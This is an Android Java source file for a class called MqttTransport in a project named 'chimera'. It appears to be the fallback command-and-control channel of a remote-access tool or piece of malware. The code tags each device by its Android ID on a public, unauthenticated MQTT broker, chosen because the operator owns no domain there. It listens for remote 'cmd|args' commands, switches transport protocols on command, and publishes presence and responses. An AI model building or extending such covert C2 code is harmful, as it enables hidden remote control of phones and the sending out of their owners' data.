package com.chimera;

import android.content.Context;
import android.provider.Settings;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;

/**
 * No-Play-Services fallback: HiveMQ public broker (free *.hivemq.cloud, no domain owned)
 * Smart gated via NetworkStateMonitor, low battery cost (QoS0, keepalive 60s)
 */
public class MqttTransport implements Transport {
    private MqttClient client;
    private volatile boolean connected = false;
    private static final String BROKER = "tcp://broker.hivemq.com:1883"; // free public, no auth, domain not owned
    // For TLS: ssl://<your-free-hivemq.cloud>:8883 - user can set via RemoteConfig

    @Override public String name() { return "mqtt"; }

    @Override
    public boolean isHealthy(Context ctx) {
        return NetworkStateMonitor.canAttemptHeartbeat(ctx);
    }

    @Override
    public void start(Context ctx) {
        if (connected) return;
        if (!isHealthy(ctx)) return;
        new Thread(() -> {
            try {
                String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                String clientId = "chimera-" + androidId;
                client = new MqttClient(BROKER, clientId, new MemoryPersistence());
                MqttConnectOptions opts = new MqttConnectOptions();
                opts.setCleanSession(true);
                opts.setAutomaticReconnect(true);
                opts.setKeepAliveInterval(60);
                opts.setConnectionTimeout(15);
                client.connect(opts);
                connected = true;
                String topic = "chimera/" + androidId + "/cmd";
                client.subscribe(topic, (t, msg) -> {
                    String payload = new String(msg.getPayload());
                    // payload format: cmd|args
                    String[] parts = payload.split("\\|",2);
                    String cmd = parts[0];
                    String args = parts.length>1?parts[1]:"";
                    if ("switch_client".equals(cmd)) TransportManager.switchToClientProtocol(ctx);
                    TransportManager.sendToActive("mqtt recv:" + payload, ctx);
                });
                // Presence
                client.publish("chimera/" + androidId + "/presence", "online".getBytes(), 0, true);
            } catch (Exception e) { ErrorLogger.logError(ctx, "Mqtt_start", e); connected=false; }
        }).start();
    }

    @Override
    public void send(String message, Context ctx) {
        if (!isHealthy(ctx)) return;
        try {
            if (client != null && client.isConnected()) {
                String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                String topic = "chimera/" + androidId + "/resp";
                client.publish(topic, message.getBytes(), 1, false);
            }
        } catch (Exception e) { ErrorLogger.logError(ctx, "Mqtt_send", e); }
    }

    @Override public void stop() {
        try { if (client != null) { client.disconnect(); client.close(); } } catch (Exception ignored) {}
        connected = false;
    }
}
